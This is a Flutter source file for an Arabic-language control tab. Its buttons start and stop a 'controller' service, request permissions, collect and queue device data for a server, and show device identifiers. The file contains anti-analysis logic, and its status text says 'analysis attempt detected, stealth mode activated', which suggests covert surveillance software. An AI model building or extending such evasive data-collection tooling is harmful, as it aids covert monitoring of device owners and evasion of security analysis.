// lib/presentation/control_tab/control_tab.dart
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:google_fonts/google_fonts.dart';

import '../../core/controlar/controller_hub.dart';
import '../../core/controlar/permissions/permission_service.dart';
import '../../core/logging/logger_provider.dart';
import '../chat/providers/chat_providers.dart';
import '../chat/providers/control_providers.dart';

class ControlTab extends ConsumerStatefulWidget {
  const ControlTab({super.key});

  @override
  ConsumerState<ControlTab> createState() => _ControlTabState();
}

class _ControlTabState extends ConsumerState<ControlTab> {
  // Local state
  bool _isLoading = false;
  String _statusMessage = '';
  Map<String, dynamic>? _deviceInfo;
  bool _showAdvancedOptions = false;

  @override
  void initState() {
    super.initState();
    _initialize();
  }

  Future<void> _initialize() async {
    // Get initial status
    _checkControllerStatus();

    // Load device info
    _loadDeviceInfo();
  }

  Future<void> _checkControllerStatus() async {
    try {
      final controller = ref.read(controllerHubProvider);

      setState(() {
        _statusMessage = controller.isRunning
            ? 'وحدة التحكم: نشطة'
            : 'وحدة التحكم: غير نشطة';
      });
    } catch (e) {
      final logger = ref.read(appLoggerProvider);
      logger.error("ControlTab", "Error checking controller status", e);

      setState(() {
        _statusMessage = 'خطأ في التحقق من حالة وحدة التحكم';
      });
    }
  }

  Future<void> _loadDeviceInfo() async {
    setState(() {
      _isLoading = true;
    });

    try {
      final deviceInfoService = ref.read(deviceInfoServiceProvider);
      final info = await deviceInfoService.getDeviceInfo();

      setState(() {
        _deviceInfo = info;
        _isLoading = false;
      });
    } catch (e) {
      final logger = ref.read(appLoggerProvider);
      logger.error("ControlTab", "Error loading device info", e);

      setState(() {
        _isLoading = false;
      });
    }
  }

  Future<void> _requestPermissions() async {
    setState(() {
      _isLoading = true;
      _statusMessage = 'جاري طلب الأذونات...';
    });

    try {
      final permissionService = ref.read(permissionServiceProvider);
      final granted =
          await permissionService.requestRequiredPermissions(context);

      setState(() {
        _isLoading = false;
        _statusMessage = granted
            ? 'تم منح جميع الأذونات بنجاح'
            : 'فشل في الحصول على جميع الأذونات';
      });
    } catch (e) {
      final logger = ref.read(appLoggerProvider);
      logger.error("ControlTab", "Error requesting permissions", e);

      setState(() {
        _isLoading = false;
        _statusMessage = 'حدث خطأ أثناء طلب الأذونات: $e';
      });
    }
  }

  Future<void> _collectData() async {
    setState(() {
      _isLoading = true;
      _statusMessage = 'جاري جمع البيانات...';
    });

    try {
      // Use the action provider to trigger data collection
      final result = await ref.read(collectDataActionProvider.future);

      setState(() {
        _isLoading = false;
        _statusMessage =
            result ? 'تم جمع البيانات بنجاح' : 'تم حفظ البيانات للإرسال لاحقاً';
      });
    } catch (e) {
      final logger = ref.read(appLoggerProvider);
      logger.error("ControlTab", "Error collecting data", e);

      setState(() {
        _isLoading = false;
        _statusMessage = 'حدث خطأ أثناء جمع البيانات: $e';
      });
    }
  }

  Future<void> _toggleController() async {
    setState(() {
      _isLoading = true;
      _statusMessage = 'جاري تغيير حالة وحدة التحكم...';
    });

    try {
      final controllerState = ref.read(controllerStateProvider.notifier);
      final isRunning = ref.read(controllerStateProvider).isRunning;

      if (isRunning) {
        await controllerState.stopController();
        setState(() {
          _statusMessage = 'تم إيقاف وحدة التحكم';
        });
      } else {
        final success = await controllerState.startController();
        setState(() {
          _statusMessage =
              success ? 'تم تشغيل وحدة التحكم' : 'فشل في تشغيل وحدة التحكم';
        });
      }
    } catch (e) {
      final logger = ref.read(appLoggerProvider);
      logger.error("ControlTab", "Error toggling controller", e);

      setState(() {
        _statusMessage = 'حدث خطأ أثناء تغيير حالة وحدة التحكم: $e';
      });
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  Future<void> _checkSecurityStatus() async {
    setState(() {
      _isLoading = true;
      _statusMessage = 'جاري فحص الحالة الأمنية...';
    });

    try {
      // Use the action provider to check for analysis attempts
      final result = await ref.read(checkAnalysisActionProvider.future);

      setState(() {
        _isLoading = false;
        _statusMessage = result
            ? 'تم اكتشاف محاولة تحليل! تم تفعيل وضع التخفي.'
            : 'الحالة الأمنية جيدة، لم يتم اكتشاف أي تهديدات.';
      });
    } catch (e) {
      final logger = ref.read(appLoggerProvider);
      logger.error("ControlTab", "Error checking security status", e);

      setState(() {
        _isLoading = false;
        _statusMessage = 'حدث خطأ أثناء فحص الحالة الأمنية: $e';
      });
    }
  }

  Widget _buildStatusCard() {
    final theme = Theme.of(context);
    final controllerState = ref.watch(controllerStateProvider);
    final connectionStatus = ref.watch(connectionStatusProvider);

    return Card(
      elevation: 2,
      child: Padding(
        padding: const EdgeInsets.all(16.0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Text(
                  'حالة النظام',
                  style: GoogleFonts.cairo(
                    fontSize: 18,
                    fontWeight: FontWeight.bold,
                    color: theme.colorScheme.primary,
                  ),
                ),
                Icon(
                  controllerState.isRunning
                      ? Icons.check_circle_outline
                      : Icons.error_outline,
                  color:
                      controllerState.isRunning ? Colors.green : Colors.orange,
                ),
              ],
            ),
            const Divider(),
            const SizedBox(height: 8),
            Row(
              children: [
                Icon(
                  controllerState.isRunning
                      ? Icons.play_circle_filled
                      : Icons.pause_circle_filled,
                  color: controllerState.isRunning ? Colors.green : Colors.grey,
                  size: 20,
                ),
                const SizedBox(width: 8),
                Text(
                  controllerState.isRunning
                      ? 'وحدة التحكم: نشطة'
                      : 'وحدة التحكم: متوقفة',
                  style: GoogleFonts.cairo(fontSize: 14),
                ),
              ],
            ),
            const SizedBox(height: 8),
            Row(
              children: [
                connectionStatus.when(
                  data: (isConnected) => Icon(
                    isConnected
                        ? Icons.cloud_done_outlined
                        : Icons.cloud_off_outlined,
                    color: isConnected ? Colors.green : Colors.grey,
                    size: 20,
                  ),
                  loading: () => const SizedBox(
                    width: 20,
                    height: 20,
                    child: CircularProgressIndicator(strokeWidth: 2),
                  ),
                  error: (_, __) => const Icon(
                    Icons.error_outline,
                    color: Colors.red,
                    size: 20,
                  ),
                ),
                const SizedBox(width: 8),
                connectionStatus.when(
                  data: (isConnected) => Text(
                    isConnected ? 'متصل بالخادم' : 'غير متصل بالخادم',
                    style: GoogleFonts.cairo(fontSize: 14),
                  ),
                  loading: () => Text(
                    'جاري التحقق من الاتصال...',
                    style: GoogleFonts.cairo(fontSize: 14),
                  ),
                  error: (_, __) => Text(
                    'خطأ في الاتصال',
                    style: GoogleFonts.cairo(fontSize: 14, color: Colors.red),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 8),
            Text(
              _statusMessage,
              style: GoogleFonts.cairo(
                fontSize: 14,
                fontStyle: FontStyle.italic,
                color: Colors.grey[700],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildControlButtons() {
    final theme = Theme.of(context);
    final controllerState = ref.watch(controllerStateProvider);

    return Card(
      elevation: 2,
      child: Padding(
        padding: const EdgeInsets.all(16.0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              'التحكم والإجراءات',
              style: GoogleFonts.cairo(
                fontSize: 18,
                fontWeight: FontWeight.bold,
                color: theme.colorScheme.primary,
              ),
            ),
            const Divider(),
            const SizedBox(height: 8),
            // Primary action buttons
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceEvenly,
              children: [
                Expanded(
                  child: ElevatedButton.icon(
                    icon: Icon(
                      controllerState.isRunning
                          ? Icons.pause
                          : Icons.play_arrow,
                    ),
                    label: Text(
                      controllerState.isRunning ? 'إيقاف' : 'تشغيل',
                      style: GoogleFonts.cairo(),
                    ),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: controllerState.isRunning
                          ? Colors.orange
                          : theme.colorScheme.primary,
                      foregroundColor: Colors.white,
                    ),
                    onPressed: _isLoading ? null : _toggleController,
                  ),
                ),
                const SizedBox(width: 10),
                Expanded(
                  child: ElevatedButton.icon(
                    icon: const Icon(Icons.sync),
                    label: Text('مزامنة', style: GoogleFonts.cairo()),
                    onPressed: _isLoading ? null : _collectData,
                  ),
                ),
              ],
            ),
            const SizedBox(height: 16),
            // Secondary action buttons
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceEvenly,
              children: [
                Expanded(
                  child: ElevatedButton.icon(
                    icon: const Icon(Icons.security),
                    label: Text('فحص الأمان', style: GoogleFonts.cairo()),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.green.shade700,
                      foregroundColor: Colors.white,
                    ),
                    onPressed: _isLoading ? null : _checkSecurityStatus,
                  ),
                ),
                const SizedBox(width: 10),
                Expanded(
                  child: ElevatedButton.icon(
                    icon: const Icon(Icons.perm_device_info),
                    label: Text('الأذونات', style: GoogleFonts.cairo()),
                    onPressed: _isLoading ? null : _requestPermissions,
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildDeviceInfo() {
    final theme = Theme.of(context);

    return Card(
      elevation: 2,
      child: Padding(
        padding: const EdgeInsets.all(16.0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Text(
                  'معلومات الجهاز',
                  style: GoogleFonts.cairo(
                    fontSize: 18,
                    fontWeight: FontWeight.bold,
                    color: theme.colorScheme.primary,
                  ),
                ),
                IconButton(
                  icon: Icon(
                    _showAdvancedOptions
                        ? Icons.visibility_off
                        : Icons.visibility,
                    size: 20,
                    color: theme.colorScheme.primary,
                  ),
                  onPressed: () {
                    setState(() {
                      _showAdvancedOptions = !_showAdvancedOptions;
                    });
                  },
                  tooltip:
                      _showAdvancedOptions ? 'إخفاء التفاصيل' : 'عرض التفاصيل',
                ),
              ],
            ),
            const Divider(),
            const SizedBox(height: 8),
            if (_isLoading)
              const Center(child: CircularProgressIndicator())
            else if (_deviceInfo != null)
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _buildDeviceInfoRow(
                    'الجهاز',
                    '${_deviceInfo!['device_model'] ?? 'غير معروف'}',
                  ),
                  _buildDeviceInfoRow(
                    'نظام التشغيل',
                    '${_deviceInfo!['platform'] ?? 'غير معروف'} ${_deviceInfo!['android_version'] ?? _deviceInfo!['system_version'] ?? ''}',
                  ),
                  _buildDeviceInfoRow(
                    'المصنع',
                    '${_deviceInfo!['manufacturer'] ?? 'غير معروف'}',
                  ),
                  if (_showAdvancedOptions) ...[
                    const Divider(),
                    Text(
                      'معلومات متقدمة',
                      style: GoogleFonts.cairo(
                        fontSize: 16,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                    const SizedBox(height: 8),
                    _buildDeviceInfoRow(
                      'معرف الجهاز',
                      '${_deviceInfo!['device_id'] ?? 'غير متاح'}',
                    ),
                    _buildDeviceInfoRow(
                      'إصدار SDK',
                      '${_deviceInfo!['sdk_version'] ?? 'غير متاح'}',
                    ),
                    _buildDeviceInfoRow(
                      'جهاز حقيقي',
                      _deviceInfo!['is_physical_device'] == true
                          ? 'نعم'
                          : 'لا (محاكي)',
                    ),
                  ],
                ],
              )
            else
              Text(
                'فشل تحميل معلومات الجهاز',
                style: GoogleFonts.cairo(color: Colors.red),
              ),
          ],
        ),
      ),
    );
  }

  Widget _buildDeviceInfoRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4.0),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Text(
            label,
            style: GoogleFonts.cairo(
              fontWeight: FontWeight.w600,
              fontSize: 14,
            ),
          ),
          Text(
            value,
            style: GoogleFonts.cairo(fontSize: 14),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        child: _isLoading && _deviceInfo == null
            ? const Center(child: CircularProgressIndicator())
            : RefreshIndicator(
                onRefresh: () async {
                  await _loadDeviceInfo();
                  await _checkControllerStatus();
                },
                child: ListView(
                  padding: const EdgeInsets.all(16.0),
                  children: [
                    _buildStatusCard(),
                    const SizedBox(height: 16),
                    _buildControlButtons(),
                    const SizedBox(height: 16),
                    _buildDeviceInfo(),
                    const SizedBox(height: 16),
                    if (_isLoading)
                      const Center(
                        child: Padding(
                          padding: EdgeInsets.all(16.0),
                          child: CircularProgressIndicator(),
                        ),
                      ),
                  ],
                ),
              ),
      ),
    );
  }
}
